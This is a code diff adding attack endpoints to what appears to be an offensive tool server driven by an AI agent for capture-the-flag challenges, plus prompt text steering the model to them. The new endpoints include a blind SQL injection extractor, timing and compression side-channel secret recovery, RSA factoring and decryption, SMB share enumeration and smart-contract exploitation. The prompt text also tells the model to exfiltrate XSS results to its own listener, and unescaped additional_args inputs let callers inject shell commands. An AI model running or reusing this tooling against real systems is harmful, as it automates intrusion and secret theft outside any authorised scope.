@@ -16082,6 +16082,472 @@ def xss_csrf_chain():
         logger.error(f"💥 Error in xss_csrf_chain endpoint: {str(e)}")
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
+@app.route("/api/tools/evtx-parser", methods=["POST"])
+def evtx_parser():
+    """Parse a Windows .evtx event log (evtx_dump / python-evtx) and surface flag/notable entries (hexfix §3 — Event-Viewing)"""
+    try:
+        params = request.json
+        evtx_file = params.get("evtx_file", "")
+        output_format = params.get("output_format", "xml")   # xml, json, jsonl
+        grep = params.get("grep", "")                          # optional keyword filter
+        full = params.get("full", False)                       # print ALL records (large!) vs only notable/grep matches
+        max_records = int(params.get("max_records", 0))        # 0 = no cap on records parsed
+        additional_args = params.get("additional_args", "")
+
+        if not evtx_file:
+            return jsonify({"error": "evtx_file parameter is required"}), 400
+
+        import shlex, shutil
+        if not os.path.isfile(evtx_file):
+            return jsonify({"error": f"file not found: {evtx_file}  (a placeholder like 'results...' won't exist — pass the real .evtx path)"}), 400
+
+        f_q = shlex.quote(evtx_file)   # challenge paths often contain spaces
+
+        # Drive the Evtx LIBRARY directly (python-evtx's console script is often broken:
+        # `from scripts.evtx_dump import main`). By DEFAULT print only notable / grep-matching records
+        # and stop at the flag — a full XML dump of a big log is multi-MB and gets killed by the command
+        # output cap (return_code -1, empty capture). Set full=true to dump everything.
+        lib_dump = (
+            "from Evtx.Evtx import Evtx\n"
+            f"p={evtx_file!r}; GREP={grep.lower()!r}; FULL={bool(full)!r}; LIM={max_records}\n"
+            "KW=['picoctf{','flag','ctf{','secret','password']\n"   # flag-relevant only; logon/process IDs via grep=
+            "n=0\n"
+            "with Evtx(p) as _log:\n"
+            "    for i,_rec in enumerate(_log.records()):\n"
+            "        if LIM and i>=LIM: break\n"
+            "        try: x=_rec.xml()\n"
+            "        except Exception: continue\n"
+            "        xl=x.lower()\n"
+            "        if FULL or (GREP and GREP in xl) or any(k in xl for k in KW):\n"
+            "            print(x); n+=1\n"
+            "        if 'picoctf{' in xl or (not FULL and n>=50): break\n"
+        )
+        rust_fmt = {"json": "-o jsonl", "jsonl": "-o jsonl", "xml": "-o xml"}.get(output_format, "-o xml")
+        candidates = [("python-evtx-library", f"python3 -c {shlex.quote(lib_dump)}")]
+        if shutil.which("evtx_dump"):
+            candidates.append(("evtx_dump-binary", f"evtx_dump {rust_fmt} {f_q}"))
+        if shutil.which("evtx_dump.py"):
+            candidates.append(("evtx_dump.py", f"evtx_dump.py {f_q}"))
+
+        logger.info(f"📑 Parsing EVTX: {evtx_file} (full={bool(full)})")
+        result, used, attempts = {}, "", []
+        for _label, _cmd in candidates:
+            _full_cmd = _cmd + (f" {additional_args}" if additional_args else "")
+            _r = execute_command(_full_cmd, use_cache=False)
+            attempts.append({"method": _label, "return_code": _r.get("return_code", 1),
+                             "stderr": (_r.get("stderr", "") or "")[:300]})
+            if _r.get("stdout", "").strip():        # accept any output (rc may be -1 on a huge/killed run)
+                result, used = _r, _label
+                break
+            result = _r   # keep the last attempt for error reporting
+        out = result.get("stdout", "")
+        result["method_used"] = used
+        result["attempts"] = attempts   # per-method return_code + stderr, so failures are diagnosable
+
+        notable = [ln.strip() for ln in out.splitlines()
+                   if any(kw in ln.lower() for kw in ["picoctf{", "flag", "ctf{", "secret", "password", "key"])]
+        result["notable_entries"] = notable[:60]
+        if grep:
+            result["grep_matches"] = [l for l in out.splitlines() if grep.lower() in l.lower()][:60]
+
+        total = len(out.splitlines())
+        result["total_lines"] = total
+        # keep the response LLM-friendly: a big XML dump bloats context and notable_entries already
+        # carries the flag/secret signal — so truncate stdout when it's large.
+        if len(out) > 8000:
+            _ls = out.splitlines()
+            result["stdout"] = ("\n".join(_ls[:60])
+                                + f"\n... [truncated {max(total - 80, 0)} of {total} lines — use grep= or read notable_entries] ...\n"
+                                + "\n".join(_ls[-20:]))
+            result["truncated"] = True
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in evtx_parser endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/rsa-factor", methods=["POST"])
+def rsa_factor():
+    """Factor an RSA modulus (Pollard p-1 / Fermat / sympy, optional RsaCtfTool) and optionally decrypt (hexfix §3 — Very Smooth)"""
+    try:
+        params = request.json
+        n = str(params.get("n", "")).strip()
+        e_exp = str(params.get("e", "65537")).strip()
+        c = str(params.get("c", "")).strip()           # optional ciphertext to decrypt
+        method = params.get("method", "auto")
+        additional_args = params.get("additional_args", "")
+
+        # Strict numeric validation — values are interpolated into python -c (blocks injection)
+        if not n or not re.fullmatch(r"\d+", n):
+            return jsonify({"error": "n parameter is required and must be a positive integer"}), 400
+        if e_exp and not re.fullmatch(r"\d+", e_exp):
+            return jsonify({"error": "e must be an integer"}), 400
+        if c and not re.fullmatch(r"\d+", c):
+            return jsonify({"error": "c must be an integer"}), 400
+
+        import shlex, shutil
+        result = {"success": False, "n": n, "e": e_exp, "method": method}
+
+        # 1. RsaCtfTool if available (best general attacker)
+        rsactf = next((b for b in ("RsaCtfTool.py", "RsaCtfTool", "rsactftool") if shutil.which(b)), "")
+        if rsactf and method in ("auto", "rsactftool"):
+            cmd = f"{rsactf} -n {n} -e {e_exp}"
+            if c:
+                cmd += f" --uncipher {c}"
+            if additional_args:
+                cmd += f" {additional_args}"
+            rc = execute_command(cmd, use_cache=False)
+            result["rsactftool_output"] = rc.get("stdout", "")[:4000]
+
+        # 2. Self-contained Python attempt (Pollard p-1 for smooth primes, Fermat for close primes, sympy fallback)
+        py = (
+            "import math\n"
+            f"n={n}; e={e_exp}; c={c or 0}\n"
+            "def pollard_pm1(n,B=200000):\n"
+            "    a=2\n"
+            "    for j in range(2,B):\n"
+            "        a=pow(a,j,n); d=math.gcd(a-1,n)\n"
+            "        if 1<d<n: return d\n"
+            "    return None\n"
+            "def fermat(n):\n"
+            "    a=math.isqrt(n)\n"
+            "    if a*a<n: a+=1\n"
+            "    for _ in range(1<<20):\n"
+            "        b2=a*a-n; b=math.isqrt(b2)\n"
+            "        if b*b==b2: return a-b\n"
+            "        a+=1\n"
+            "    return None\n"
+            "p=pollard_pm1(n) or fermat(n)\n"
+            "if not p:\n"
+            "    try:\n"
+            "        from sympy import factorint\n"
+            "        fs=factorint(n); p=sorted(fs)[0] if fs else None\n"
+            "    except Exception: p=None\n"
+            "if p and n%p==0:\n"
+            "    q=n//p; phi=(p-1)*(q-1)\n"
+            "    print('FACTOR_P', p); print('FACTOR_Q', q)\n"
+            "    if c and e:\n"
+            "        d=pow(e,-1,phi); m=pow(c,d,n)\n"
+            "        h=format(m,'x'); h=('0'+h) if len(h)%2 else h\n"
+            "        try: print('PLAINTEXT', bytes.fromhex(h))\n"
+            "        except Exception: print('PLAINTEXT_INT', m)\n"
+            "else:\n"
+            "    print('NO_FACTOR_FOUND')\n"
+        )
+        pc = execute_command(f"python3 -c {shlex.quote(py)}", use_cache=False)
+        pout = pc.get("stdout", "")
+        result["python_solver_output"] = pout
+        result["success"] = ("FACTOR_P" in pout) or ("BEGIN RSA" in result.get("rsactftool_output", ""))
+        logger.info(f"🔢 RSA factor attempt for {len(n)}-digit modulus")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in rsa_factor endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/compression-oracle", methods=["POST"])
+def compression_oracle():
+    """Generate a CRIME/BREACH compression-length side-channel harness for byte-by-byte secret recovery (hexfix §3 — Compress and Attack)"""
+    try:
+        params = request.json
+        target_url = params.get("target_url", "")
+        reflect_param = params.get("reflect_param", "q")
+        known_prefix = params.get("known_prefix", "picoCTF{")
+        charset = params.get("charset", "") or "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"
+        method = params.get("method", "GET").upper()
+
+        if not target_url:
+            return jsonify({"error": "target_url parameter is required"}), 400
+
+        sender = (f"requests.get(URL, params={{PARAM: payload}})" if method == "GET"
+                  else f"requests.post(URL, data={{PARAM: payload}})")
+        tmpl = [
+            "#!/usr/bin/env python3",
+            "# CRIME/BREACH byte-by-byte recovery — pick the guess that compresses smallest.",
+            "import requests",
+            f"URL = {target_url!r}",
+            f"PARAM = {reflect_param!r}",
+            f"KNOWN = {known_prefix!r}",
+            f"CHARSET = {charset!r}",
+            "def length(payload):",
+            f"    r = {sender}",
+            "    return len(r.content)",
+            "secret = KNOWN",
+            "while not secret.endswith('}'):",
+            "    best, best_len = None, 10**9",
+            "    for ch in CHARSET:",
+            "        guess = secret + ch",
+            "        l = length(guess + '~~' + guess)   # padding amplifies the compression signal",
+            "        if l < best_len:",
+            "            best_len, best = l, ch",
+            "    if best is None:",
+            "        break",
+            "    secret += best",
+            "    print('recovered:', secret)",
+            "print('FLAG:', secret)",
+        ]
+        result = {
+            "success": True,
+            "target_url": target_url,
+            "harness": "\n".join(tmpl),
+            "note": ("Run via execute_python_script against the live oracle. BREACH needs the secret "
+                     "reflected in a gzip-compressed response; tune padding/CHARSET to the challenge."),
+        }
+        logger.info(f"🗜️ Compression-oracle harness generated for {target_url}")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in compression_oracle endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/sqli-order-oracle", methods=["POST"])
+def sqli_order_oracle():
+    """Boolean-blind SQLi extractor using ORDER BY / CASE WHEN — covers the variant blind_sqli_extractor misses (hexfix §3 — ORDER ORDER)"""
+    try:
+        params = request.json
+        url = params.get("url", "")
+        param = params.get("param", "")
+        method = params.get("method", "GET").upper()
+        true_marker = params.get("true_marker", "")        # substring present only on TRUE responses
+        template = params.get("template", "1 ORDER BY (CASE WHEN ({cond}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)")
+        query = params.get("query", "substr((SELECT group_concat(flag) FROM flags),{pos},1)")
+        compare = params.get("compare") or "ascii({expr})>{val}"   # per-DB; SQLite: "unicode({expr})>{val}"
+        max_len = int(params.get("max_len", 64))
+        extra_data = params.get("data", {}) or {}           # other request fields
+
+        if not url or not param:
+            return jsonify({"error": "url and param parameters are required"}), 400
+        if not true_marker:
+            return jsonify({"error": "true_marker is required (a string that appears only on TRUE responses)"}), 400
+
+        def truth(cond):
+            inj = template.format(cond=cond)
+            payload = dict(extra_data); payload[param] = inj
+            try:
+                if method == "POST":
+                    r = requests.post(url, data=payload, timeout=10, verify=False)
+                else:
+                    r = requests.get(url, params=payload, timeout=10, verify=False)
+                return true_marker in r.text
+            except Exception:
+                return False
+
+        extracted = ""
+        for pos in range(1, max_len + 1):
+            ch_expr = query.format(pos=pos)
+            lo, hi = 32, 126   # binary-search the ASCII value
+            while lo < hi:
+                mid = (lo + hi) // 2
+                if truth(compare.format(expr=ch_expr, val=mid)):
+                    lo = mid + 1
+                else:
+                    hi = mid
+            if lo == 32:
+                break          # no char / end of string
+            extracted += chr(lo)
+            if extracted.endswith("}"):
+                break
+        result = {"success": bool(extracted), "url": url, "param": param,
+                  "extracted": extracted, "length": len(extracted),
+                  "note": "Defaults are MySQL-style; for SQLite pass compare='unicode({expr})>{val}'. Tune template=/query=/compare= per DB."}
+        logger.info(f"🧪 ORDER BY blind SQLi extracted {len(extracted)} chars from {url}")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in sqli_order_oracle endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/timing-oracle", methods=["POST"])
+def timing_oracle():
+    """Timing side-channel harness: recover a secret char-by-char by response time (hexfix §3 — SideChannel)"""
+    try:
+        import time as _time, statistics, shlex
+        params = request.json
+        mode = params.get("mode", "http")               # http or command
+        url = params.get("url", "")
+        param = params.get("param", "pin")
+        method = params.get("method", "POST").upper()
+        command_template = params.get("command_template", "")   # mode=command, {guess} placeholder
+        charset = params.get("charset", "0123456789")
+        known_prefix = params.get("known_prefix", "")
+        max_len = int(params.get("max_len", 8))
+        samples = int(params.get("samples", 5))
+        extra_data = params.get("data", {}) or {}
+
+        if mode == "http" and not url:
+            return jsonify({"error": "url is required for mode=http"}), 400
+        if mode == "command" and not command_template:
+            return jsonify({"error": "command_template (with a {guess} placeholder) is required for mode=command"}), 400
+
+        def measure(guess):
+            times = []
+            for _ in range(samples):
+                t0 = _time.time()
+                if mode == "http":
+                    payload = dict(extra_data); payload[param] = guess
+                    try:
+                        if method == "POST":
+                            requests.post(url, data=payload, timeout=10, verify=False)
+                        else:
+                            requests.get(url, params=payload, timeout=10, verify=False)
+                    except Exception:
+                        pass
+                else:
+                    execute_command(command_template.replace("{guess}", shlex.quote(guess)), use_cache=False)
+                times.append(_time.time() - t0)
+            return statistics.median(times)
+
+        recovered = known_prefix
+        per_position = []
+        for _ in range(max_len):
+            best_ch, best_t, timings = None, -1.0, {}
+            for ch in charset:
+                t = measure(recovered + ch)
+                timings[ch] = round(t, 4)
+                if t > best_t:
+                    best_t, best_ch = t, ch
+            per_position.append(timings)
+            if best_ch is None:
+                break
+            recovered += best_ch
+        result = {"success": bool(recovered != known_prefix), "mode": mode,
+                  "recovered": recovered, "per_position_timings": per_position,
+                  "note": "Picks the slowest candidate per position (early-abort compare leak). Raise 'samples' on noisy targets."}
+        logger.info(f"⏱️ Timing-oracle recovered candidate: {recovered}")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in timing_oracle endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/smb-ipp-exploit", methods=["POST"])
+def smb_ipp_exploit():
+    """Enumerate/attack SMB shares and IPP/CUPS print services (Printer Shares family) (hexfix §3 — Printer Shares 2/3)"""
+    try:
+        params = request.json
+        target = params.get("target", "")
+        service = params.get("service", "auto")          # smb, ipp, auto
+        action = params.get("action", "enum")
+        share = params.get("share", "")
+        username = params.get("username", "")
+        password = params.get("password", "")
+        port = params.get("port", "")
+        additional_args = params.get("additional_args", "")
+
+        if not target:
+            return jsonify({"error": "target parameter is required"}), 400
+
+        import shlex, shutil
+        t_q = shlex.quote(target)
+        result = {"success": False, "target": target, "service": service, "action": action, "commands": []}
+
+        def run(label, cmd):
+            result["commands"].append(cmd)
+            r = execute_command(cmd, use_cache=False)
+            result[label] = r.get("stdout", "")
+            if r.get("success", False):
+                result["success"] = True
+
+        if service in ("smb", "auto"):
+            nxc = next((b for b in ("nxc", "netexec", "crackmapexec") if shutil.which(b)), "")
+            if nxc:
+                cmd = f"{nxc} smb {t_q} --shares"
+                if username:
+                    cmd += f" -u {shlex.quote(username)} -p {shlex.quote(password)}"
+                run("smb_enum", cmd)
+            elif shutil.which("smbclient"):
+                auth = f"-U {shlex.quote(username + '%' + password)}" if username else "-N"
+                run("smb_shares", f"smbclient -L {t_q} {auth}")
+            if share and shutil.which("smbclient"):
+                auth = f"-U {shlex.quote(username + '%' + password)}" if username else "-N"
+                unc = shlex.quote(f"//{target}/{share}")
+                run("smb_get", f"smbclient {unc} {auth} -c {shlex.quote('recurse ON; ls')}")
+
+        if service in ("ipp", "auto"):
+            ipp_port = str(port) if port else "631"
+            if shutil.which("ipptool"):
+                run("ipp_attrs", f"ipptool -tv {shlex.quote('ipp://' + target + ':' + ipp_port + '/')} get-printer-attributes.test")
+            run("ipp_nmap", f"nmap -p {shlex.quote(ipp_port)} --script cups-info,cups-queue-info {t_q}")
+
+        if additional_args:
+            run("additional", f"{additional_args} {t_q}")
+
+        logger.info(f"🖨️ SMB/IPP run against {target}")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in smb_ipp_exploit endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/tools/blockchain-exploit", methods=["POST"])
+def blockchain_exploit():
+    """Interact with / exploit a smart contract via foundry 'cast' (call/send/storage/balance/code) (hexfix §3 — Blockchain)"""
+    try:
+        params = request.json
+        rpc_url = params.get("rpc_url", "")
+        action = params.get("action", "call")            # call, send, storage, balance, code
+        to = params.get("to", "")                          # contract address
+        sig = params.get("sig", "")                        # function signature, e.g. "withdraw()"
+        args = params.get("args", "")                      # space-separated function args
+        private_key = params.get("private_key", "")
+        value = params.get("value", "")                    # wei to send
+        slot = params.get("slot", "")                      # for storage reads
+        additional_args = params.get("additional_args", "")
+
+        if not rpc_url:
+            return jsonify({"error": "rpc_url parameter is required"}), 400
+
+        import shlex, shutil
+        cast_bin = shutil.which("cast")
+        if not cast_bin:
+            _fp = os.path.expanduser("~/.foundry/bin/cast")   # foundryup installs here; may not be on the server's PATH
+            cast_bin = _fp if os.path.isfile(_fp) else ""
+        if not cast_bin:
+            return jsonify({"success": False,
+                            "error": "foundry 'cast' not found on PATH or ~/.foundry/bin — restart the hexstrike server in a shell where foundry is on PATH, or run foundryup"}), 200
+        cast_q = shlex.quote(cast_bin)
+
+        r_q = shlex.quote(rpc_url)
+        result = {"success": False, "action": action, "rpc_url": rpc_url}
+
+        if action == "call":
+            if not to or not sig:
+                return jsonify({"error": "to and sig are required for action=call"}), 400
+            cmd = f"{cast_q} call {shlex.quote(to)} {shlex.quote(sig)}"
+            if args:
+                cmd += f" {args}"
+            cmd += f" --rpc-url {r_q}"
+        elif action == "send":
+            if not to or not sig or not private_key:
+                return jsonify({"error": "to, sig and private_key are required for action=send"}), 400
+            cmd = f"{cast_q} send {shlex.quote(to)} {shlex.quote(sig)}"
+            if args:
+                cmd += f" {args}"
+            cmd += f" --rpc-url {r_q} --private-key {shlex.quote(private_key)}"
+            if value:
+                cmd += f" --value {shlex.quote(str(value))}"
+        elif action == "storage":
+            if not to:
+                return jsonify({"error": "to is required for action=storage"}), 400
+            cmd = f"{cast_q} storage {shlex.quote(to)} {shlex.quote(str(slot or '0'))} --rpc-url {r_q}"
+        elif action == "balance":
+            cmd = f"{cast_q} balance {shlex.quote(to)} --rpc-url {r_q}"
+        elif action == "code":
+            cmd = f"{cast_q} code {shlex.quote(to)} --rpc-url {r_q}"
+        else:
+            return jsonify({"error": "Invalid action. Use: call, send, storage, balance, code"}), 400
+
+        if additional_args:
+            cmd += f" {additional_args}"
+        cmd = f"FOUNDRY_DISABLE_NIGHTLY_WARNING=1 {cmd}"   # keep the nightly-build warning out of stderr
+
+        logger.info(f"⛓️ Blockchain {action} via cast → {to or rpc_url}")
+        res = execute_command(cmd, use_cache=False)
+        result["output"] = res.get("stdout", "")
+        result["stderr"] = res.get("stderr", "")
+        result["success"] = res.get("success", False)
+        result["command"] = cmd
+        result["note"] = ("Reentrancy needs an attacker contract: deploy with 'forge create', then loop "
+                          "deposit->withdraw. This wraps single cast calls; chain them for the full exploit.")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 Error in blockchain_exploit endpoint: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
 @app.route("/api/tools/steghide", methods=["POST"])
 def steghide():
     """Execute Steghide for steganography analysis with enhanced logging"""
@@ -17306,6 +17772,32 @@ def get_experiment_prompt():
             strategy_preamble += (
                 "  - For an XSS / headless-bot challenge, use xss_csrf_chain (injects the payload and drives\n"
                 "    a browser); embed your own listener URL in the payload for out-of-band exfiltration.\n"
+            )
+
+        # Direct the model to the §3 capability tools by category (hexfix §3)
+        if category.lower() == "forensics":
+            strategy_preamble += (
+                "  - For a Windows .evtx event log use evtx_parser; for a timing side-channel use\n"
+                "    timing_oracle (recovers a secret char-by-char from response time).\n"
+            )
+        if category.lower() in ("crypto", "cryptography"):
+            strategy_preamble += (
+                "  - For RSA with a weak/smooth modulus use rsa_factor (Pollard p-1 / Fermat / sympy);\n"
+                "    for a compression-length side-channel (CRIME/BREACH) use compression_oracle.\n"
+            )
+        if category.lower() in ("web", "web exploitation"):
+            strategy_preamble += (
+                "  - For ORDER BY / CASE WHEN boolean-blind SQLi (not a plain parameter value) use\n"
+                "    sqli_order_oracle; for a compression side-channel use compression_oracle.\n"
+            )
+        if category.lower() in ("general", "general skills", "misc"):
+            strategy_preamble += (
+                "  - For SMB shares or IPP/CUPS printers (Printer Shares) use smb_ipp_exploit.\n"
+            )
+        if category.lower() == "blockchain":
+            strategy_preamble += (
+                "  - For smart-contract interaction/exploitation use blockchain_exploit (foundry cast:\n"
+                "    call/send/storage) — access-control, overflow, reentrancy setup.\n"
             )
 
         if experiment == 1:
